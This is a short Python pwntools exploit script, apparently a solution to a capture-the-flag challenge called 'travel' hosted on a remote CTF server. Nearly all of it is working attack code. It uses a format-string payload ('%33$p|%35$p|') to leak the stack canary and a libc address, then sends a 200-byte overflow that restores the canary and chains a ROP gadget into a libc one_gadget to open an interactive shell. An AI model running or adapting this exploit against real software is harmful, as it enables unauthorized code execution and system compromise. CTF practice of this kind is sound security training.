from pwn import *

def leak():
    temp = r.recvuntil(b"|")
    temp = str(temp)
    temp = temp[2:len(temp)-2]
    temp = int(temp,16)
    return temp
r = remote("01.linux.challenges.ctf.thefewchosen.com" ,50910)
#r = process("./travel")
r.sendlineafter('Where do you want to go?\n' , b"%33$p|%35$p|")
r.recvuntil(b'hmm... ')
canary = leak()
libc_leak = leak()
libc_base = libc_leak - 0x29d90
rop_gadget = libc_base + 0x419c4
one_gadget = libc_base + 0x50a37
log.info(f"[LEAK] canary: {hex(canary)}")
log.info(f"[LEAK] libc_leak: {hex(libc_leak)}")
log.info(f"[LEAK] libc_base: {hex(libc_base)}")
exploit = b"A" * 200 + p64(canary) + p64(0x0) + p64(rop_gadget) + p64(0x0) + p64(one_gadget)
r.sendlineafter('When do you want to go?\n' , exploit)
r.interactive()
